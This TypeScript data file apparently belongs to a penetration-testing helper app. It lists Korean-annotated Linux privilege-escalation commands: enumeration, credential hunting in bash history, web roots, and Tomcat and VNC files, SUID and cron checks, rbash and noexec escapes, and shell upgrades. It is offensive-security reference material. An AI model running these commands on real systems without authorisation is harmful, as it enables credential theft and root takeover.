// Manual Linux privesc checklist -- copy-only reference, same spirit as
// sqlPayloads.ts/lfiPayloads.ts: nothing here runs automatically or judges
// success, the operator reads each command, decides whether it applies, and
// either copies it or sends it into their own shell one at a time. LinPEAS
// (PrivescSessionPanel's existing "LinPEAS 명령 셸에 입력" button) already
// automates most of this in one pass; this list exists for the case that
// prompted it -- knowing WHERE to look (e.g. a service's config file lives
// in a different path depending on the distro's packaging) without needing
// to already remember the convention or wait on a full LinPEAS run.
export type PrivescCommand = { label: string; command: string; note?: string };
export type PrivescCategory = {
  id: string;
  title: string;
  description: string;
  commands: PrivescCommand[];
};

export const linuxPrivescCategories: PrivescCategory[] = [
  {
    id: "basic-info",
    title: "기본 정보 수집",
    description: "권한, 배포판, 커널 버전부터 확인합니다 -- 이후 모든 탐색 방향(어떤 익스플로잇이 " +
      "말이 되는지, 설정 파일이 어느 배포판 경로에 있을지)이 여기서 갈립니다.",
    commands: [
      { label: "현재 사용자·그룹", command: "id" },
      { label: "sudo 권한", command: "sudo -l",
        note: "리버스쉘 등 완전한 tty가 없는 셸에서는 비밀번호가 맞아도 " +
          "\"a terminal is required\"로 실패할 수 있습니다 -- SSH 등으로 " +
          "완전한 tty를 얻은 뒤 다시 시도하세요." },
      { label: "커널·아키텍처", command: "uname -a" },
      { label: "배포판 식별", command: "cat /etc/os-release 2>/dev/null || cat /etc/issue",
        note: "Debian/Ubuntu 계열인지 RHEL/CentOS 계열인지에 따라 아래 " +
          "서비스 설정 파일 경로가 달라집니다." },
      { label: "PATH·환경변수", command: "echo $PATH; env" },
      { label: "네트워크 인터페이스", command: "ip a 2>/dev/null || ifconfig -a",
        note: "이 호스트를 통해 다른 내부 네트워크로 피벗할 수 있는지 확인." },
      { label: "bash 히스토리에서 평문 비밀번호 찾기",
        command: "cat ~/.bash_history /root/.bash_history 2>/dev/null | " +
          "grep -iE 'pass|pwd|ssh |mysql |psql '",
        note: "다른 사용자가 명령줄 인자로 비밀번호를 직접 입력한 흔적이 남아있는 경우가 많습니다." },
      { label: "웹 루트·설정 디렉터리에서 비밀번호 문자열 검색",
        command: "grep -rnwiE '/var/www|/etc' -e 'password|passwd|pwd|secret|api_key' " +
          "2>/dev/null | grep -v 'Binary file'",
        note: "config-paths 카테고리처럼 어느 서비스인지 짐작이 갈 때만 특정 파일을 보는 게 " +
          "아니라, 아예 짐작이 안 갈 때 웹 루트/설정 디렉터리 전체를 훑는 용도입니다. " +
          "결과가 너무 많으면 -l(파일명만)로 먼저 범위를 좁히세요." },
      { label: "설정·백업 파일 이름으로 전체 검색",
        command: "find / -type f \\( -name '*config*' -o -name '*.conf' -o " +
          "-name '*backup*' -o -name '*.bak' \\) 2>/dev/null" },
      { label: "숨김 파일 전체 검색",
        command: "find / -name '.*' -type f 2>/dev/null",
        note: "설정을 숨김 디렉터리(.config, .ssh 등)나 숨김 파일에 두는 경우를 놓치지 " +
          "않기 위함입니다. 결과가 매우 많으니 grep으로 더 좁혀서 보세요." },
    ],
  },
  {
    id: "suid-cap",
    title: "SUID / Capabilities",
    description: "루트 소유 SUID 바이너리나 파일 capability는 GTFOBins에서 바로 검색해볼 수 있는 " +
      "가장 흔한 권한 상승 경로입니다. find는 시스템 전체를 훑으므로 시간이 걸릴 수 있습니다.",
    commands: [
      { label: "SUID 바이너리 전체 검색", command: "find / -perm -4000 -type f 2>/dev/null" },
      { label: "SGID 바이너리 전체 검색", command: "find / -perm -2000 -type f 2>/dev/null" },
      { label: "파일 capability 검색", command: "getcap -r / 2>/dev/null",
        note: "SUID만 보면 놓치는 경로입니다 -- capability만으로도 " +
          "루트급 동작(예: cap_setuid)이 가능한 바이너리가 있을 수 있습니다." },
      { label: "sudo 버전 확인", command: "sudo --version",
        note: "1.8.25~1.8.31(CVE-2019-18634), 1.8.2~1.8.31p2(CVE-2021-3156, " +
          "Baron Samedit) 등 알려진 sudo 자체 취약점부터 대조해보세요." },
    ],
  },
  {
    id: "cron-services",
    title: "크론 / 서비스 설정 파일",
    description: "루트로 도는 예약 작업이나 서비스 설정에 현재 사용자가 쓰기 권한을 가진 경우, " +
      "그 파일을 통해 루트 권한으로 코드가 실행되게 만들 수 있습니다.",
    commands: [
      { label: "시스템 크론탭", command: "cat /etc/crontab 2>/dev/null" },
      { label: "크론 디렉터리", command: "ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ 2>/dev/null" },
      { label: "사용자 크론탭", command: "ls -la /var/spool/cron/crontabs/ 2>/dev/null" },
      { label: "크론이 돌리는 스크립트 내용", command: "grep -rhoE '(/[a-zA-Z0-9._-]+)+\\.sh' " +
        "/etc/crontab /etc/cron.d/ 2>/dev/null | sort -u | xargs -I{} sh -c 'echo ==={}===; cat {}' " +
        "2>/dev/null",
        note: "tar/rsync/7z 등을 와일드카드(*)로 호출하는 스크립트는 GTFOBins의 " +
          "wildcard injection으로 루트 권한 실행을 얻을 수 있습니다." },
      { label: "루트로 도는 프로세스", command: "ps aux | grep '^root'" },
      { label: "쓰기 가능한 systemd 유닛", command: "find /etc/systemd/system /lib/systemd/system " +
        "-writable -type f 2>/dev/null" },
    ],
  },
  {
    id: "config-paths",
    title: "흔한 서비스 설정 파일 위치",
    description: "같은 서비스라도 배포판 패키징 관례에 따라 설정 파일 경로가 다릅니다 -- 현재 " +
      "디렉터리(예: DB data 디렉터리)에서 안 보인다고 설정이 없는 게 아니라, 다른 경로에 " +
      "분리돼 있을 뿐인 경우가 많습니다.",
    commands: [
      { label: "PostgreSQL 인증 설정 (Debian/Ubuntu)",
        command: "cat /etc/postgresql/*/main/pg_hba.conf 2>/dev/null",
        note: "데이터 디렉터리(/var/lib/postgresql/<버전>/main)와 설정 디렉터리가 " +
          "분리돼 있는 Debian/Ubuntu apt 패키징 관례입니다." },
      { label: "PostgreSQL 인증 설정 (RHEL/CentOS)",
        command: "cat /var/lib/pgsql/data/pg_hba.conf 2>/dev/null",
        note: "RHEL 계열은 데이터·설정이 같은 디렉터리에 있는 경우가 많습니다." },
      { label: "MySQL/MariaDB 설정", command: "cat /etc/mysql/my.cnf /etc/mysql/mariadb.conf.d/*.cnf " +
        "2>/dev/null" },
      { label: "Redis 설정", command: "cat /etc/redis/redis.conf 2>/dev/null",
        note: "인증 없이 접근 가능(unauthenticated)한지, requirepass가 비어있는지부터 확인하세요." },
      { label: "MongoDB 설정", command: "cat /etc/mongod.conf /etc/mongodb.conf 2>/dev/null",
        note: "배포판·설치 방식에 따라 파일명이 mongod.conf/mongodb.conf로 갈립니다." },
      { label: "Apache 설정 (Debian)", command: "cat /etc/apache2/apache2.conf 2>/dev/null" },
      { label: "Apache 설정 (RHEL, httpd)", command: "cat /etc/httpd/conf/httpd.conf 2>/dev/null" },
      { label: "Nginx 설정", command: "cat /etc/nginx/nginx.conf 2>/dev/null" },
      { label: "Tomcat 사용자·비밀번호", command: "find / -name tomcat-users.xml 2>/dev/null " +
        "-exec cat {} \\;",
        note: "manager/admin 계정이 평문으로 들어있는 경우가 많습니다 -- Tomcat Manager " +
          "war 배포 RCE로 바로 이어지는 흔한 경로입니다." },
      { label: "SSH 서버 설정", command: "cat /etc/ssh/sshd_config 2>/dev/null" },
      { label: "Samba(SMB) 설정", command: "cat /etc/samba/smb.conf 2>/dev/null",
        note: "익명/게스트 쓰기 가능한 공유([share] 섹션의 writable/guest ok)가 있는지 확인." },
      { label: "NFS 공유 목록", command: "cat /etc/exports 2>/dev/null",
        note: "no_root_squash가 걸린 공유는 클라이언트에서 root로 파일을 심어 privesc할 수 있습니다." },
      { label: "vsftpd 설정", command: "cat /etc/vsftpd.conf 2>/dev/null" },
      { label: "ProFTPD 설정", command: "cat /etc/proftpd/proftpd.conf 2>/dev/null" },
      { label: "rsyncd 설정", command: "cat /etc/rsyncd.conf 2>/dev/null",
        note: "인증 없는 모듈(auth users 미설정)이 있으면 그대로 파일을 읽고 쓸 수 있습니다." },
      { label: "SNMP 설정", command: "cat /etc/snmp/snmpd.conf 2>/dev/null",
        note: "커뮤니티 문자열(public/private 등)이 평문으로 저장돼 있습니다." },
      { label: "OpenLDAP 설정 (Debian, cn=config)", command: "ls /etc/ldap/slapd.d/ 2>/dev/null; " +
        "cat /etc/ldap/slapd.d/cn=config/olcDatabase*.ldif 2>/dev/null" },
      { label: "OpenLDAP 설정 (RHEL, 구형)", command: "cat /etc/openldap/slapd.conf 2>/dev/null" },
      { label: "Exim 설정 (Debian)", command: "cat /etc/exim4/exim4.conf.template 2>/dev/null" },
      { label: "Postfix 설정", command: "cat /etc/postfix/main.cf 2>/dev/null" },
      { label: "Docker 데몬 설정", command: "cat /etc/docker/daemon.json 2>/dev/null; " +
        "groups | grep -o docker",
        note: "현재 사용자가 docker 그룹에 속해 있으면 그 자체로 루트 권한 상승 경로입니다 " +
          "(호스트 루트를 마운트한 컨테이너를 직접 띄울 수 있음)." },
      { label: "VNC 저장된 비밀번호", command: "find / -name '*.vnc' -o -name 'passwd' -path '*vnc*' " +
        "2>/dev/null",
        note: "찾은 파일은 이 앱의 VNC 비밀번호 복호화 도구(Decoders)에 그대로 넣어보세요 " +
          "(DES-ECB로 약하게 암호화돼 있어 복호화 가능)." },
    ],
  },
  {
    id: "writable-shell",
    title: "쓰기 가능 파일 / 셸 안정화",
    description: "루트가 소유하지만 현재 사용자가 쓸 수 있는 파일을 찾거나, 비인터랙티브 리버스쉘을 " +
      "완전한 tty로 업그레이드합니다.",
    commands: [
      { label: "루트 소유·전체 쓰기 가능 파일", command: "find / -writable -user root -type f " +
        "2>/dev/null | grep -v -E '^/(proc|sys)'" },
      { label: "PATH 상 쓰기 가능한 디렉터리", command: "echo $PATH | tr ':' '\\n' | " +
        "xargs -I{} find {} -maxdepth 0 -writable 2>/dev/null" },
      { label: "tty 업그레이드 (python3)", command: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
        note: "이어서 Ctrl+Z → stty raw -echo; fg → export TERM=xterm 순으로 실행하면 " +
          "sudo 비밀번호 프롬프트 등 완전한 tty가 필요한 명령도 정상 동작합니다." },
    ],
  },
  {
    id: "restricted-shell",
    title: "제한된 셸/실행 환경 대응",
    description: "ls·cat 같은 기본 명령이 없거나 막혀 있을 때 -- 제한 셸(rbash), BusyBox, 최소 " +
      "컨테이너, noexec 마운트에서 자주 마주치는 상황과 우회입니다.",
    commands: [
      { label: "제한 셸(rbash) 여부 확인", command: "echo $0; echo $SHELL" },
      { label: "BASH_CMDS로 rbash 우회", command: "BASH_CMDS[a]=/bin/sh; a",
        note: "rbash가 PATH 변경과 / 포함 명령은 막아도 BASH_CMDS 배열 조작은 " +
          "막지 않는 경우가 많습니다." },
      { label: "awk로 셸 얻기", command: "awk 'BEGIN {system(\"/bin/sh\")}'" },
      { label: "find로 셸 얻기", command: "find . -maxdepth 0 -exec /bin/sh \\; " },
      { label: "vi/vim 안에서 셸 탈출", command: ":!/bin/sh",
        note: "vi/vim이 실행 가능하면 그 안에서 이 명령을 입력(Esc 누른 뒤)하세요 -- " +
          "셸 명령이 아니라 vi 명령 모드에 입력하는 문법입니다." },
      { label: "BusyBox인지 확인", command: "ls -la $(which ls) 2>/dev/null; busybox 2>&1 | head -1",
        note: "busybox로 심볼릭 링크돼 있으면 ls/cat 등 개별 옵션이 GNU coreutils보다 " +
          "훨씬 제한적입니다." },
      { label: "BusyBox 내장 명령 직접 호출", command: "busybox cat /etc/passwd" },
      { label: "BusyBox 셸 얻기", command: "busybox sh" },
      { label: "ls 없이 디렉터리 나열 (셸 글롭)", command: "echo */*",
        note: "scratch/distroless 컨테이너처럼 ls/cat 바이너리 자체가 없을 때도 셸 내장 " +
          "글롭 확장은 대개 동작합니다." },
      { label: "noexec 마운트 여부 확인", command: "mount | grep -E '\\s/(tmp|dev/shm)\\s'",
        note: "noexec로 마운트된 /tmp에 올린 바이너리는 실행 권한을 줘도 실행되지 않습니다." },
      { label: "noexec 우회 (exec 허용되는 /dev/shm으로 이동)",
        command: "cp payload /dev/shm/payload; chmod +x /dev/shm/payload; /dev/shm/payload",
        note: "/dev/shm은 대부분 배포판에서 exec를 막지 않습니다. 그마저 막혀 있으면 " +
          "인터프리터 기반 실행(아래)으로 전환하세요." },
      { label: "noexec 우회 (인터프리터로 실행)", command: "python3 payload.py",
        note: "noexec는 바이너리 자체의 실행을 막는 것이지 인터프리터(python3/perl/bash)가 " +
          "스크립트 파일을 읽어 실행하는 것은 막지 못하는 경우가 많습니다." },
    ],
  },
];
